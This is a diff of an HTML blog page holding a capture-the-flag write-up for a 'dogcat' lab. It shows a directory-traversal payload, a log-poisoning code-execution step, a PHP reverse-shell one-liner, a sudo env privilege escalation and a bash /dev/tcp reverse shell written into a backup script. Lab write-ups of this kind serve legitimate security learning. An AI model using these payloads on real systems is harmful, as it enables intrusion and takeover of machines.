@@ -100,15 +100,15 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
     
 
     <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/dogcat/">
-    <link href="https://novaclearnscyber.github.io/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
-    <link href="https://novaclearnscyber.github.io/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
-    <link rel="apple-touch-icon" sizes="180x180" href="https://novaclearnscyber.github.io/blog/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://novaclearnscyber.github.io/blog/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://novaclearnscyber.github.io/blog/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="https://novaclearnscyber.github.io/blog/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
 
 
 
@@ -121,14 +121,14 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
     <meta name="color-scheme" content="light dark">
 
     
-    <link rel="icon" type="image/svg+xml" href="https://novaclearnscyber.github.io/blog/icons/favicon.svg">
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
 
     
     
     
       
-<link rel="icon" type="image/png" href="https://novaclearnscyber.github.io/blog/favicon.png">
-<link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.png">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
     
 </head>
 
@@ -146,6 +146,16 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
         </a>
     </div>
+    
+    <ul class="menu">
+        
+        <li>
+            <a href="/blog/categories/">
+                Categories
+            </a>
+        </li>
+        
+    </ul>
     
 </nav>
 
@@ -200,13 +210,13 @@ stroke-linejoin="round" class="feather feather-home">
                 <p>scaning :<br>
 nothing interesting just ssh and http</p>
 <p>accesing the website we see thi s, ok cool<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063123.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063123.png" alt=""><br>
 if we press dog for example apicture of a dog will be shown, ok cool , but look at the url, i think this site is vulanrable to a directory traversal<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063139.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063139.png" alt=""><br>
 ok cool it is , now its time to craft the payload<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063107.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063107.png" alt=""><br>
 ok interesting lets also look inside the source code<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224064157.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224064157.png" alt=""><br>
 ok cool  lets use something from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion">https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion</a></p>
 <p>and we found this</p>
 <pre tabindex="0"><code>php://filter/convert.base64-encode/resource=index.php
@@ -214,7 +224,7 @@ ok cool  lets use something from <a href="https://swisskyrepo.github.io/Payloads
 modified to out needs it will be :</p>
 <pre tabindex="0"><code>php://filter/convert.base64-encode/resource=./cat../../index
 </code></pre><p>and we get this<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224064949.png" alt="">decoding that will get the code of our page</p>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224064949.png" alt="">decoding that will get the code of our page</p>
 <pre tabindex="0"><code>&lt;!DOCTYPE HTML&gt;
 &lt;html&gt;
 
@@ -249,7 +259,7 @@ modified to out needs it will be :</p>
 
 &lt;/html&gt;
 </code></pre><p>ok cool based on that html code we see that we have to declare our extrnasion for the directory traveersal to work  in the ext var<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224065538.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224065538.png" alt=""><br>
 and we just like that with the payload</p>
 <pre tabindex="0"><code>http://10.114.188.64/?view=./dog../../../../../../../../../../etc/passwd&amp;ext=
 </code></pre><p>passwd file</p>
@@ -257,60 +267,60 @@ and we just like that with the payload</p>
 </code></pre><p>ok cool , lets try a log poisoning attack<br>
 log poisoning attack is attack where we introduce some malicios code into a log file , then when we open the log file with directory traversal the code will be executed</p>
 <p>we gonna use this from payload all the things<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224070913.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224070913.png" alt=""><br>
 more exactly</p>
 <pre tabindex="0"><code>http://example.com/index.php?page=/var/log/apache/access.log
 </code></pre><p>but we goona have to use for apache2<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071105.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071105.png" alt=""><br>
 ok cool pretty messy but cool</p>
 <pre tabindex="0"><code>view=./dog../../../../../../../../../../var/log/apache2/access.log&amp;ext=
 </code></pre><p>the payload in case u need it</p>
 <p>lets send it to burpsuite</p>
 <pre tabindex="0"><code>	to send it with no foxy rpoxy we can just go to firefox settings , search proxy and modify the proxy as bellow 
-</code></pre><p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071333.png" alt=""></p>
+</code></pre><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071333.png" alt=""></p>
 <p>set the interceptor on in the proxy section and we got hte request<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071425.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071425.png" alt=""><br>
 tight click on it and send it to the repeater<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071628.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071628.png" alt=""><br>
 and now we see this more pretty text , cool</p>
 <p>looking more closely this is what we are going to exploit<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224072926.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224072926.png" alt=""><br>
 using a custom get parameter<br>
 i modified the request as following<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224073442.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224073442.png" alt=""><br>
 and get the following :</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png" alt="">cool we can see that we are www-data</p>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png" alt="">cool we can see that we are www-data</p>
 <p>so now that we have remote code execution we can get a reverse shell , we know that the system has php installed so i tried the following line</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;YOUr_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </span></span></code></pre></div><p>just replace the cmd with that then select the cmd value , press CONVERT SELEECTION -&gt; URL -&gt; URL ENCODE</p>
 <p>also start nc on ehat port u want logic<br>
 and bam we have a reverse shell<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075037.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075037.png" alt=""><br>
 cool lets look around ,<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png" alt=""><br>
 and we found the first flag<br>
 i pugradeed the shell with</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/bash script -q /dev/null
-</span></span></code></pre></div><p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png" alt=""><br>
+</span></span></code></pre></div><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png" alt=""><br>
 ok cool now lets try to priv esc<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png" alt=""><br>
 and boom easy , what i ded here was , run <code>sudo -l </code> to see that we can run as root<br>
 we found we can run env as root , so i search on gtfobins and found that env /bin/sh -p gives me root acces , and boom now lets just find the flags<br>
 founded flag2<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224080546.png" alt=""></p>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224080546.png" alt=""></p>
 <p>but if we are already root and cand find flag 4 where can it be? that may mean we are in a docker container lets check it using</p>
 <pre tabindex="0"><code>cat /proc/1/cgroup 
-</code></pre><p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224080740.png" alt=""><br>
+</code></pre><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224080740.png" alt=""><br>
 and we are , cool</p>
 <p>ok lets look inside the opt<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224081750.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224081750.png" alt=""><br>
 cool and we can find a backup.sh script , leets modify it with yet another reverse shell</p>
 <p>i pasther intro backup.sh this</p>
 <pre tabindex="0"><code>#!/bin/bash
 bash -i &gt;&amp; /dev/tcp/192.168.146.225/53  0&gt;&amp;1
 </code></pre><p>try  to put using two cats may be easier<br>
 start a nc to listen on our machine and in a short time we get another shell and boom, the 4th flag is here<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224081640.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224081640.png" alt=""><br>
 very cool room</p>
 
             </div>
